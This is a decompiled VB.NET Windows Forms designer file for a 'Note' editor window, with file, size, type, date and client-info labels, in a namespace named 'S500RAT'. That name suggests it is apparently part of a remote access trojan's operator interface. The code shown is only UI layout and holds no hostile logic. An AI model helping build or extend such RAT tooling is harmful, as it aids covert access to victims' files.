Namespace S500RAT
	' Token: 0x0200002F RID: 47
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormNote
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000DD6 RID: 3542 RVA: 0x0007BD58 File Offset: 0x00079F58
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000DD7 RID: 3543 RVA: 0x0007BDA8 File Offset: 0x00079FA8
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormNote))
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.Save = New Global.Guna.UI2.WinForms.Guna2GradientButton()
			Me.NameForm = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.Guna2Elipse1 = New Global.Guna.UI2.WinForms.Guna2Elipse(Me.components)
			Me.Label2 = New Global.System.Windows.Forms.Label()
			Me.labelfile = New Global.System.Windows.Forms.Label()
			Me.labelsize = New Global.System.Windows.Forms.Label()
			Me.label3 = New Global.System.Windows.Forms.Label()
			Me.Label1 = New Global.System.Windows.Forms.Label()
			Me.LabelType = New Global.System.Windows.Forms.Label()
			Me.Label5 = New Global.System.Windows.Forms.Label()
			Me.LabelDate = New Global.System.Windows.Forms.Label()
			Me.Guna2ResizeBox1 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.Timer2 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.TextBox1 = New Global.Sunny.UI.UIRichTextBox()
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			MyBase.SuspendLayout()
			Me.Timer1.Enabled = True
			Me.Timer1.Interval = 1000
			Me.Save.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Save.BackColor = Global.System.Drawing.Color.Transparent
			Me.Save.BorderRadius = 8
			Me.Save.CheckedState.Parent = Me.Save
			Me.Save.CustomImages.Parent = Me.Save
			Me.Save.Enabled = False
			Me.Save.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Save.FillColor2 = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Save.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Save.ForeColor = Global.System.Drawing.Color.White
			Me.Save.HoverState.Parent = Me.Save
			Me.Save.Location = New Global.System.Drawing.Point(430, 370)
			Me.Save.Name = "Save"
			Me.Save.ShadowDecoration.Parent = Me.Save
			Me.Save.Size = New Global.System.Drawing.Size(122, 32)
			Me.Save.TabIndex = 460
			Me.Save.Text = "Save"
			Me.NameForm.AutoSize = True
			Me.NameForm.BackColor = Global.System.Drawing.Color.Transparent
			Me.NameForm.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.NameForm.ForeColor = Global.System.Drawing.Color.White
			Me.NameForm.Location = New Global.System.Drawing.Point(24, 8)
			Me.NameForm.Name = "NameForm"
			Me.NameForm.Size = New Global.System.Drawing.Size(49, 19)
			Me.NameForm.Style = Global.Sunny.UI.UIStyle.Custom
			Me.NameForm.TabIndex = 462
			Me.NameForm.Text = "Editor"
			Me.NameForm.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(25, 32)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(18, 16)
			Me.ClientInfo.TabIndex = 463
			Me.ClientInfo.Text = "--"
			Me.Guna2Elipse1.BorderRadius = 15
			Me.Label2.AutoSize = True
			Me.Label2.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Label2.ForeColor = Global.System.Drawing.Color.Silver
			Me.Label2.Location = New Global.System.Drawing.Point(21, 91)
			Me.Label2.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.Label2.Name = "Label2"
			Me.Label2.Size = New Global.System.Drawing.Size(36, 14)
			Me.Label2.TabIndex = 467
			Me.Label2.Text = "Size :"
			Me.labelfile.AutoSize = True
			Me.labelfile.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.labelfile.Location = New Global.System.Drawing.Point(61, 69)
			Me.labelfile.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.labelfile.Name = "labelfile"
			Me.labelfile.Size = New Global.System.Drawing.Size(13, 14)
			Me.labelfile.TabIndex = 464
			Me.labelfile.Text = ".."
			Me.labelsize.AutoSize = True
			Me.labelsize.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.labelsize.ForeColor = Global.System.Drawing.Color.White
			Me.labelsize.Location = New Global.System.Drawing.Point(61, 91)
			Me.labelsize.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.labelsize.Name = "labelsize"
			Me.labelsize.Size = New Global.System.Drawing.Size(13, 14)
			Me.labelsize.TabIndex = 465
			Me.labelsize.Text = ".."
			Me.label3.AutoSize = True
			Me.label3.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.label3.ForeColor = Global.System.Drawing.Color.Silver
			Me.label3.Location = New Global.System.Drawing.Point(25, 69)
			Me.label3.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.label3.Name = "label3"
			Me.label3.Size = New Global.System.Drawing.Size(32, 14)
			Me.label3.TabIndex = 466
			Me.label3.Text = "File :"
			Me.Label1.AutoSize = True
			Me.Label1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Label1.ForeColor = Global.System.Drawing.Color.Silver
			Me.Label1.Location = New Global.System.Drawing.Point(18, 113)
			Me.Label1.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.Label1.Name = "Label1"
			Me.Label1.Size = New Global.System.Drawing.Size(39, 14)
			Me.Label1.TabIndex = 469
			Me.Label1.Text = "Type :"
			Me.LabelType.AutoSize = True
			Me.LabelType.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.LabelType.ForeColor = Global.System.Drawing.Color.White
			Me.LabelType.Location = New Global.System.Drawing.Point(61, 113)
			Me.LabelType.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.LabelType.Name = "LabelType"
			Me.LabelType.Size = New Global.System.Drawing.Size(13, 14)
			Me.LabelType.TabIndex = 468
			Me.LabelType.Text = ".."
			Me.Label5.AutoSize = True
			Me.Label5.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Label5.ForeColor = Global.System.Drawing.Color.Silver
			Me.Label5.Location = New Global.System.Drawing.Point(20, 140)
			Me.Label5.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.Label5.Name = "Label5"
			Me.Label5.Size = New Global.System.Drawing.Size(37, 14)
			Me.Label5.TabIndex = 471
			Me.Label5.Text = "Date :"
			Me.LabelDate.AutoSize = True
			Me.LabelDate.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.LabelDate.ForeColor = Global.System.Drawing.Color.White
			Me.LabelDate.Location = New Global.System.Drawing.Point(61, 140)
			Me.LabelDate.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.LabelDate.Name = "LabelDate"
			Me.LabelDate.Size = New Global.System.Drawing.Size(13, 14)
			Me.LabelDate.TabIndex = 470
			Me.LabelDate.Text = ".."
			Me.Guna2ResizeBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox1.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.Guna2ResizeBox1.FillColor = Global.System.Drawing.Color.White
			Me.Guna2ResizeBox1.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox1.Location = New Global.System.Drawing.Point(558, 394)
			Me.Guna2ResizeBox1.Name = "Guna2ResizeBox1"
			Me.Guna2ResizeBox1.Size = New Global.System.Drawing.Size(17, 19)
			Me.Guna2ResizeBox1.TabIndex = 472
			Me.Guna2ResizeBox1.TargetControl = Me
			Me.Timer2.Enabled = True
			Me.Timer2.Interval = 1000
			Me.TextBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.TextBox1.AutoWordSelection = True
			Me.TextBox1.BackColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.TextBox1.FillColor = Global.System.Drawing.Color.FromArgb(7, 11, 48)
			Me.TextBox1.FillColor2 = Global.System.Drawing.SystemColors.WindowFrame
			Me.TextBox1.FillDisableColor = Global.System.Drawing.Color.Red
			Me.TextBox1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.TextBox1.ForeColor = Global.System.Drawing.Color.White
			Me.TextBox1.ForeDisableColor = Global.System.Drawing.Color.Blue
			Me.TextBox1.Location = New Global.System.Drawing.Point(17, 170)
			Me.TextBox1.Margin = New Global.System.Windows.Forms.Padding(3, 5, 3, 5)
			Me.TextBox1.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.TextBox1.Name = "TextBox1"
			Me.TextBox1.Padding = New Global.System.Windows.Forms.Padding(2)
			Me.TextBox1.Radius = 8
			Me.TextBox1.RectColor = Global.System.Drawing.Color.FromArgb(82, 43, 235)
			Me.TextBox1.Size = New Global.System.Drawing.Size(558, 192)
			Me.TextBox1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.TextBox1.TabIndex = 478
			Me.TextBox1.TextAlignment = Global.System.Drawing.ContentAlignment.MiddleCenter
			Me.TextBox1.WordWrap = True
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(506, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 557
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(532, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 556
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(558, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 555
			Me.ExitForm.Text = "ValleyClose1"
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 40
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(590, 423)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.TextBox1)
			MyBase.Controls.Add(Me.Guna2ResizeBox1)
			MyBase.Controls.Add(Me.Label5)
			MyBase.Controls.Add(Me.LabelDate)
			MyBase.Controls.Add(Me.Label1)
			MyBase.Controls.Add(Me.LabelType)
			MyBase.Controls.Add(Me.Label2)
			MyBase.Controls.Add(Me.labelfile)
			MyBase.Controls.Add(Me.labelsize)
			MyBase.Controls.Add(Me.label3)
			MyBase.Controls.Add(Me.NameForm)
			MyBase.Controls.Add(Me.ClientInfo)
			MyBase.Controls.Add(Me.Save)
			Me.DoubleBuffered = True
			Me.ForeColor = Global.System.Drawing.Color.White
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormNote"
			Me.Text = "Note"
			MyBase.TopMost = True
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x0400062D RID: 1581
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
